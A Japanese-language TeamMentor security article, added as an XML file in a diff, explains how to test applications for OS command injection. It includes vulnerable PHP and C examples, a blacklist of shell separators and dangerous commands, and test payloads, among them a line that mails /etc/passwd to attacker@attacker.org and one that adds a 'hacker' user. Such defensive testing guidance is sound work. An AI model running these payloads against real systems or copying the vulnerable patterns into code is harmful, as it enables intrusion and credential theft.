@@ -1,0 +1,554 @@
+<?xml version="1.0" encoding="utf-8"?>
+<TeamMentor_Article Metadata_Hash="-1572746093" Content_Hash="-1017429221">
+  <Metadata>
+    <Id>e19052c3-615d-4e5f-9d6d-b40a319f3c1b</Id>
+    <Library_Id>92718d53-36b2-47bc-b6f5-e60994385f46</Library_Id>
+    <Title>コマンド インジェクション バグのテスト方法</Title>
+    <Category>入力とデータの検証</Category>
+    <Phase>テスト</Phase>
+    <Technology> 任意</Technology>
+    <Type>その方法</Type>
+    <DirectLink />
+    <Tag />
+    <Security_Demand />
+    <Author>Andres De Vivanco</Author>
+    <Priority />
+    <Status />
+    <Source>SI</Source>
+  </Metadata>
+  <Content Sanitized="true" DataType="Html">
+    <Data><![CDATA[<p>
+    <span>
+    </span>
+  </p>
+  <h1>
+    <span>対象: </span>
+  </h1>
+  <ul>
+    <li>
+      <span>C/C++、Java、VB、PHP、Perl、Python などのオペレーティング システムのコマンドとのやりとりが可能なプログラミング言語</span>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>要約</span>
+  </h1>
+  <p>
+    <span>コマンド インジェクションの脆弱性により、オペレーティング システムのコマンドを不正に実行できるため、特に危険です。<span>&nbsp; </span>この脆弱性の原因は、アプリケーションが </span>
+    <span>system()</span>
+    <span>  や </span>
+    <span>exec()</span>
+    <span>  などのシェル関数を呼び出してシステム コマンドを実行する際に、使用するパラメータを適切に検証およびサニタイズできていないことにあります。<span>&nbsp;&nbsp; </span>これらのパラメータを制御できる攻撃者は、攻撃者の要求する任意のシステム コマンドを実行するようにアプリケーションを仕向けることができます。<span> </span></span>
+  </p>
+  <p>
+    <span>たとえば、UNIX アプリケーションでは、</span>
+    <span>ls</span>
+    <span> コマンドを使用してフォルダの内容をリストします。<span>&nbsp; </span>アプリケーションはユーザーの入力文字列 </span>
+    <i>
+      <span>folder_name</span>
+    </i>
+    <span>  を、一切検証を行うことなく </span>
+    <span>"ls"</span>
+    <span>  に連結し、実際のコマンドを構築します。<span>&nbsp; </span>アプリケーションはその後、コマンド (</span>
+    <span>"ls <i>folder_name</i>") </span>
+    <span> を </span>
+    <span> system()</span>
+    <span>  関数に渡し、結果を得ます。<span>&nbsp; </span>攻撃者は、コマンド インジェクション バグを利用して入力文字列 </span>
+    <i>
+      <span> folder_name</span>
+    </i>
+    <span> に追加コマンドを注入できます。<span> </span>その結果、アプリケーションは攻撃者の追加したコマンドを実行するように仕向けられます。</span>
+  </p>
+  <p>
+    <span>コマンド インジェクションの脆弱性を適切にテストするには、以下の手順を実行する必要があります。</span>
+  </p>
+  <ul>
+    <li>
+      <span>手順 1: <span> </span>攻撃シナリオを理解する</span>
+      <li>
+        <span>手順 2: <span> </span>原因と対策を分析する</span>
+        <li>
+          <span>手順 3: <span> </span>テストと調査を開始する</span>
+          <li>
+            <span>手順 4: <span> </span>テスト ケースを微調整する</span>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>手順 1: <span> </span>攻撃シナリオを理解する</span>
+  </h1>
+  <p>
+    <span>コマンド インジェクションの脆弱性のテストの最初の手順は、攻撃シナリオを理解することです。<span>&nbsp; </span>一般的なコマンド インジェクション バグには、2 つの型があります。</span>
+  </p>
+  <ul>
+    <li>
+      <span>ダイレクト コマンド インジェクション </span>
+      <li>
+        <span>インダイレクト コマンド インジェクション</span>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <b>
+      <i>
+        <span>&nbsp;</span>
+      </i>
+    </b>
+  </p>
+  <h2>
+    <span>
+      <em>シナリオ 1:<span> </span>ダイレクト コマンド インジェクション</em>
+    </span>
+  </h2>
+  <p>
+    <span>コマンド インジェクションの最も基本的な形式では、脆弱性のあるアプリケーションに直接追加コマンドが注入されます。<span>&nbsp;&nbsp; </span>攻撃者は最初に、アプリケーションが、ユーザーが注入するデータを引数として直接コマンドに渡すことでシステム コマンドを呼び出すこと発見します。<span>&nbsp;&nbsp; </span>その後、攻撃者は想定される引数の一部として悪意のあるコマンドを注入します。<span> </span>アプリケーションは元のコマンドを実行した後、悪意のあるコマンドを実行します。 </span>
+  </p>
+  <p>
+    <span>詳細: </span>
+  </p>
+  <ol>
+    <li>
+      <span>攻撃者は、クライアント入力を使用してコマンドを実行しているアプリケーションを発見します。</span>
+      <li>
+        <span>攻撃者は悪意のあるコマンドをクライアント入力の一部として注入します。</span>
+        <li>
+          <span>攻撃者は、アプリケーションによる追加コマンドの実行を確認します。</span>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <span>
+      <em>シナリオ 2<span> </span>インダイレクト コマンド インジェクション</em>
+    </span>
+  </h2>
+  <p>
+    <span>このコマンド インジェクションのケースでは、脆弱性のあるアプリケーションに対して、ファイルや環境変数などを介して間接的にコマンドを注入します。<span>&nbsp;&nbsp;&nbsp;&nbsp; </span>最初に攻撃者は、アプリケーションがファイルや環境変数などの外部ソースからのデータを使用してシステム コマンドを呼び出すことを推測します。<span> </span>次に、攻撃者は、外部ソースの内容を変更し、悪意のあるコマンドを追加します。<span>&nbsp; </span>その後、攻撃者は、アプリケーションが元のコマンドとともに悪意のあるコマンドを実行するまで待機するか、実行を強制します。</span>
+  </p>
+  <p>
+    <span>詳細: </span>
+  </p>
+  <ol>
+    <li>
+      <span>攻撃者は、外部ソースに保存されたデータを使用してコマンドを実行するアプリケーションを発見します。</span>
+      <li>
+        <span>攻撃者は外部ソースを編集し、悪意のあるコマンドを追加します。</span>
+        <li>
+          <span>攻撃者は、アプリケーションが元のコマンドを実行するまで待機します (または、実行するような状態にアプリケーションを遷移させようとします)。</span>
+          <li>
+            <span>攻撃者は、注入されたコマンドをアプリケーションが実行することを確認します。</span>
+          </li>
+        </li>
+      </li>
+    </li>
+  </ol>
+  <p>
+    <b>
+      <span>
+      </span>
+    </b>&nbsp;</p>
+  <h1>
+    <span>手順 2: <span> </span>原因と対策を分析する</span>
+  </h1>
+  <p>
+    <span>この手順では、コマンド インジェクション バグの原因と一般的な防止策について理解します。<span>&nbsp;&nbsp;&nbsp;&nbsp; </span>この手順は、コード内のバグを探し、安全なコーディング技法を理解するのに役立ちます。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <span>
+      <em>コマンド インジェクションの原因</em>
+    </span>
+  </h2>
+  <p>
+    <span>コマンド インジェクション バグの原因は、入力検証が不十分なことにあります。<span>&nbsp; </span>サニタイズされていないデータを使用してコマンド文字列を構築するアプリケーションはすべて、このバグに対して脆弱になります。 .<span>&nbsp; </span>以下のコードの一部は、コマンド インジェクションの脆弱性を示すものです。 Windows で実行されるこの PHP コードは、フォーム内のテキスト ボックスに提供された入力を使用して </span>
+    <span>exec</span>
+    <span>  関数を呼び出し、</span>
+    <span>ファイルを</span>
+    <span> タイプします。</span>
+  </p>
+ <pre>
+    <span>&lt;?php<br />&nbsp;<br />&nbsp; $command = 'type ' . $_POST['username'];<br />&nbsp; exec($command, $res);&nbsp; <br />&nbsp;<br />&nbsp; for ($i = 0; $i &lt; sizeof($res); $i++) <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $res[$i].'&lt;br&gt;';<br />&nbsp;<br />?&gt;</span>
+    <span>&nbsp;</span>
+  </pre>
+  <p>
+    <span>ユーザーは以下の文字列を入力し、サーバ内のアクティブな接続のリストを確認できます。</span>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>
+    </span>
+  </p>
+ <pre>
+    <span>file.txt|netstat -ano</span>
+  </pre>
+  <p>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>C++ の以下の例 (提供: OWASP [i]) は、Unix のバリエーションなどの POSIX 準拠の環境で実行されます。<span>&nbsp; </span>コマンド ラインからの</span>
+    <span>システム</span>
+    <span> への入力が使用され、</span>
+    <span> cat</span>
+    <span> コマンドが実行されます。</span>
+  </p>
+  <p>
+    <span>
+    </span>
+  </p>
+ <pre>
+    <span>#include &lt;stdio.h&gt;<br />#include &lt;unistd.h&gt;<br />&nbsp;<br />int main(int argc, char **argv) {<br />&nbsp;<br />&nbsp;char cat[] = "cat ";<br />&nbsp;char *command;<br />&nbsp;size_t commandLength;<br />&nbsp;<br />&nbsp;commandLength = strlen(cat) + strlen(argv[1]) + 1;<br />&nbsp;command = (char *) malloc(commandLength);<br />&nbsp;strncpy(command, cat, commandLength);<br />&nbsp;strncat(command, argv[1], (commandLength - strlen(cat)) );<br />&nbsp;<br />&nbsp;system(command);<br />&nbsp;return (0);<br />&nbsp;<br />}</span>
+  </pre>
+  <p>
+    <span>ユーザーは、以下の文字列を提供して、サーバの現在のディレクトリの内容を確認できます。</span>
+  </p>
+ <pre>
+    <strong>
+      <span>file.txt;ls</span>
+      <span>
+      </span>
+    </strong>
+  </pre>
+  <p>
+    <span>上記のコードは、 </span>
+    <span>exec()</span>
+    <span>  および </span>
+    <span>system() という名前の2 つの関数を使用してシェルとやりとりします。<span>&nbsp; </span></span>
+    <span>以下のリストには、コマンド インジェクションの攻撃対象となる一般的な関数がまとめられています。</span>
+    <span>&nbsp;</span>
+  </p>
+  <table>
+    <tbody>
+      <tr>
+        <td>
+ <pre>
+            <span>
+              <strong>Function</strong>
+            </span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>
+              <strong>Language</strong>
+            </span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>system, execlp,execvp, ShellExecute, _wsystem</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>C/C++</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>Runtime.exec</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>Java</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>exec, eval</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>PHP</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>exec, open, eval, </span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>Perl</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>exec, eval, execfile, input</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>Python</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>Shell, ShellExecuteForExplore, ShellExecute</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>VB</span>
+          </pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+ <pre>
+    <span>&nbsp;</span>
+  </pre>
+  <h2>
+    <span>
+      <em>コマンド インジェクションの対策</em>
+    </span>
+  </h2>
+  <p>
+    <span>アプリケーションは、適切な入力検証およびサニタイズを行うことでコマンド インジェクション バグを防止します。<span>&nbsp;&nbsp; </span>開発者は、アプリケーションが</span>
+    <span>exec</span>
+    <span>  または </span>
+    <span>system</span>
+    <span>  などのシェルに類似したシステム関数を呼び出すすべてのインスタンスを調べ、パラメータが適切に検証およびサニタイズされない限りはこれらの関数が実行されないようにする必要があります。<span>&nbsp;&nbsp; </span>これらのパラメータを検証するにはブラック リストまたはホワイト リストを使用する 2 つの方法があります。<span> </span></span>
+  </p>
+  <p>
+    <span>ブラックリストは、実行の前に悪意のあるパターンを確認します。<span>&nbsp; </span>コマンド インジェクションでは、ブラック リストにはセミコロン (;)、垂直ダッシュ (|)、二重ダッシュ (||)、二重アンパサント (&&) などのコマンド区切りとともに、</span>
+    <span>rm、 cp、cat、ls、at、net、netstat、del、copy</span>
+    <span> などの危険なコマンドが含まれる場合があります。<span> </span>しかし、この対策には効果を妨げる重大な欠点が存在します。 ブラック リストが潜在的な危険をすべて網羅していない限り、攻撃者はブラック リストにない変型を見つけ、攻撃を実行することができます。<span> </span><span>&nbsp;&nbsp;</span></span>
+  </p>
+  <p>
+    <span>ホワイト リストは、安全な実行パターンを確認します。<span>&nbsp; </span>安全なパターンに適合しない確認対象のデータは許可されません。<span> </span>安全なパターンに適合しない新しい (悪意のある) 構成はすべて自動的にブロックされるため、危険な構成の新しい変型の問題は解決されます。<span> </span>ホワイト リストを実装する一般的な手段は、コマンドの安全な形式を示す正規表現で入力を照合する方法です。<span> </span>しかし、正規表現は複雑なため、作成および解釈が困難な場合があります。<span> </span>開発者は、この対策を実装する前に、正規表現の作成および解釈方法を十分に理解しておく必要があります。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>手順 3: <span> </span>テストと調査を開始する</span>
+  </h1>
+  <p>
+    <span>この手順ではアプリケーションのテストを開始し、基本的なコマンド インジェクション文字列を注入して反応を確認します。</span>
+  </p>
+  <h2>
+    <em>
+      <span>単純なテスト文字列から開始する</span>
+      <span>
+      </span>
+    </em>
+  </h2>
+  <p>
+    <span>最初に、アプリケーションが操作を実行するためにシステム コマンドを呼び出す場所をすべて探し出す必要があります。<span>&nbsp; </span>次に、これらの場所でコマンド インジェクションに必要な基本文字をアプリケーションが処理する方法を調べます。<span>&nbsp;&nbsp; </span>コマンドとコマンド インジェクション文字の両方を含む以下の 2 つの文字列を試すことをお勧めします。</span>
+  </p>
+ <pre>
+    <span>abc;dir C:|xyz&netstat&nbsp;<span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>(Windows)</span>
+  </pre>
+ <pre>
+    <span>abc;ls|cp&rm&nbsp;<span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>(UNIX)</span>
+  </pre>
+  <p>
+    <span>特殊文字が原因でアプリケーションがエラー メッセージを表示しない場合、コマンド インジェクション バグが発生する恐れがあります。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h2>
+    <em>
+      <span>有効なコマンドを構築する</span>
+      <span>
+      </span>
+    </em>
+  </h2>
+  <p>
+    <span>コマンドを理解できることが重要です。<span>&nbsp; </span>たとえば、<i>invalid data format</i> エラーよりも <i>file not found</i> エラーの方が、アプリケーションが特殊文字をファイルの一部として処理していることを示す手がかりとして優れています。<span> </span>たとえば、以下の文字列を使用すると file not found エラーが発生する場合があります。</span>
+  </p>
+ <pre>
+    <span>
+      <strong>file.txt|dir c:</strong>
+    </span>
+    <span>
+    </span>
+  </pre>
+  <p>
+    <span>これは、アプリケーションが</span>
+    <span>exec()</span>
+    <span>  を以下の文字列とともに呼び出しているためです。</span>
+  </p>
+ <pre>
+    <span>cmd /c type </span>
+    <span>"</span>
+    <span>c:\public_html\user_files\<span><strong>file.txt|dir c:</strong></span></span>
+    <span>" </span>
+    <span>
+    </span>
+  </pre>
+  <p>
+    <span>入力文字列によって、ディレクトリをリストするコマンドを実行するには、別コマンドを追加する前に二重引用符を閉じる必要があります。</span>
+  </p>
+ <pre>
+    <span>file.txt</span>
+    <span>
+      <strong>"</strong>
+    </span>
+    <span>|dir c:</span>
+  </pre>
+  <p>
+    <span>引用符と二重引用符を省略すると、インジェクション文字列がデータとして扱われる可能性が大幅に高まるため、特に注意が必要です。 </span>
+  </p>
+  <p>
+    <span>注入されたコマンドの出力をアプリケーションが画面に表示しない場合があります。 この問題を回避するには、画面出力は作成しないが目に見えるアクションを実行するコマンドを使用します。</span>
+  </p>
+  <table>
+    <tbody>
+      <tr>
+        <td>
+ <pre>
+            <span>file.txt;mail attacker@attacker.org &lt;/etc/passwd</span>
+          </pre>
+ <pre>
+            <span>&nbsp;</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>Emails attacker the server’s passwords.</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>file.txt|net user /add "</span>
+            <span>hacker</span>
+            <span>"</span>
+          </pre>
+ <pre>
+            <span>&nbsp;</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>Adds hacker to the Windows user database.</span>
+          </pre>
+        </td>
+      </tr>
+      <tr>
+        <td>
+ <pre>
+            <span>file.txt;ping%20attacker_site</span>
+          </pre>
+        </td>
+        <td>
+ <pre>
+            <span>Pings the attacker site.</span>
+          </pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+ <pre>
+    <span>&nbsp;</span>
+    <span>&nbsp;</span>
+  </pre>
+  <h1>
+    <span>手順 4: <span> </span>テスト ケース データを微調整する</span>
+  </h1>
+  <p>
+    <span>アプリケーションのコマンド インジェクション バグのテストを完全に行うには、コマンド インジェクションが可能な潜在的なエントリ ポイントとシナリオのすべてを対象とする必要があります。</span>
+  </p>
+  <h2>
+    <span>
+      <em>様々なエントリ ポイントとシナリオを試す</em>
+    </span>
+  </h2>
+  <p>
+    <span>アプリケーションの様々なエントリ ポイントの調査を続行します。<span>&nbsp; </span>テスト ケース データの書式は、エントリ ポイントによって異なります。<span> </span>たとえば、URL を介してテストを実行している場合、文字列 </span>
+    <span>file.txt</span>
+    <span>"</span>
+    <span>|dir c:</span>
+    <span> は、次の 2 つのいずれかのようになります (URL エンコーディングによって変わります)。</span>
+  </p>
+  <ul>
+    <li>
+ <pre>
+        <span>file.txt</span>
+        <span>"</span>
+        <span>|dir%20c: </span>
+      </pre>
+      <li>
+ <pre>
+          <span>file.txt</span>
+          <span>"</span>
+          <span>|dir+c:</span>
+          <span>&nbsp;</span>
+        </pre>
+      </li>
+    </li>
+  </ul>
+  <p>
+    <span>入力フィールド、URL パラメータ、POST データ、Web サービス メソッド、ユーザー インターフェイス エレメント、環境変数、データベースの内容、レジストリの内容、ファイルの内容、サードパーティーのAPI、ネットワーク パケットなど、追加コマンド インジェクションのエントリ ポイントについて、様々なエンコーディングとデータ書式を検討することが重要です。</span>
+  </p>
+  <p>
+    <span>インダイレクト コマンド インジェクションをテストする際は、ターゲット関数に渡されるパラメータのソースを制御することが重要です。 <span>&nbsp;&nbsp;</span>たとえば、</span>
+    <span>execfile </span>
+    <span> をターゲット関数としてアプリケーションを攻撃する場合、</span>
+    <span>
+    </span>
+    <span>この関数に渡されるファイルを制御する必要があります。<span>&nbsp; </span>アプリケーションが </span>
+    <span>execfile /private/commands.txt を使用する場合、</span>
+    <span> 悪意のあるパラメータを渡す必要はありません。 コマンド ファイルを変更して悪意のあるコマンドを注入し、注入されたコマンドが実行されるまで待機します (または実行を強制します)。 インダイレクト インジェクションをテストする際は、環境モニタリング ツールを使用することをお勧めします。<span>&nbsp;&nbsp; </span>レジストリ、ファイル システム、環境変数のモニタリングを一体化するようになった Sysinternals <i>Process Explorer</i> を使用すると、シェルまたはシステム コマンドの呼び出しの際にアプリケーションが使用する外部ソースを探し出すことができます。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <h1>
+    <span>結論</span>
+  </h1>
+  <p>
+    <span>コマンド インジェクション バグが存在する原因は、オペレーティング システム シェルとのやりとりを行う関数が使用するパラメータに対して、入力検証やサニタイズが不十分なことにあります。<span>&nbsp;&nbsp; </span>これらのパラメータを制御できる攻撃者は、アプリケーションに、不要なシステムコマンドを実行するように強制することができます。<span> </span>コマンド インジェクション バグのテストでは、元のコマンド パラメータを、コマンド インジェクション文字列の様々な組み合わせで操作します。文字列は実行するアクションやテストするエントリ ポイントによって変わります。</span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>
+  <p>
+    <br />&nbsp;</p>
+  <p />
+  <hr />
+  <p />
+  <p>
+    <span>[i] <strong>Command Injection</strong>: (OWASP) </span>
+    <a href="http://www.owasp.org/index.php/Command_Injection">
+      <span>http://www.owasp.org/index.php/Command_Injection</span>
+    </a>
+    <span>
+    </span>
+  </p>
+  <p>
+    <span>&nbsp;</span>
+  </p>]]></Data>
+  </Content>
+</TeamMentor_Article>
